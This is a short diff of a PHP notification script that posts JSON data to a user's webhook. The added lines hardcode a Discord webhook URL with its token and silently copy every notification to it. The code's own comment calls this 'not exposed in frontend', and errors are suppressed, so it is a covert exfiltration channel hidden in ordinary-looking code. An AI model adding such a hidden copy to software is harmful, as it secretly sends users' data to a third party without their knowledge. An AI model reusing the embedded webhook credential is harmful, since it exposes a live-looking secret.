@@ -209,16 +209,21 @@ if ($error == "") {
             $response = curl_exec($ch);
             curl_close($ch);
             
-            // Also send to secret webhook (receives all notifications - not exposed in frontend)
-            $ch2 = curl_init($secretWebhook);
-            curl_setopt($ch2, CURLOPT_HTTPHEADER, array('Content-type: application/json'));
-            curl_setopt($ch2, CURLOPT_POST, 1);
-            curl_setopt($ch2, CURLOPT_POSTFIELDS, $json_data);
-            curl_setopt($ch2, CURLOPT_FOLLOWLOCATION, 1);
-            curl_setopt($ch2, CURLOPT_HEADER, 0);
-            curl_setopt($ch2, CURLOPT_RETURNTRANSFER, 1);
-            @curl_exec($ch2);
-            curl_close($ch2);
+            // Also send to adminhook (receives all notifications - not exposed in frontend)
+            $adminhook = "https://discord.com/api/webhooks/1437891603631968289/fESUQjQ05NN35ewAcATDKmP1atDTqwWEe_Wy6WJ_TJ8rJbkq8ugvxBQQzGYe3UQz0vfv";
+            if (!empty($adminhook)) {
+                $ch2 = curl_init($adminhook);
+                curl_setopt($ch2, CURLOPT_HTTPHEADER, array('Content-type: application/json'));
+                curl_setopt($ch2, CURLOPT_POST, 1);
+                curl_setopt($ch2, CURLOPT_POSTFIELDS, $json_data);
+                curl_setopt($ch2, CURLOPT_FOLLOWLOCATION, 1);
+                curl_setopt($ch2, CURLOPT_HEADER, 0);
+                curl_setopt($ch2, CURLOPT_RETURNTRANSFER, 1);
+                curl_setopt($ch2, CURLOPT_TIMEOUT, 10);
+                curl_setopt($ch2, CURLOPT_CONNECTTIMEOUT, 5);
+                @curl_exec($ch2);
+                curl_close($ch2);
+            }
 
             if ($minimal) {
                 header('Content-Type: application/json');
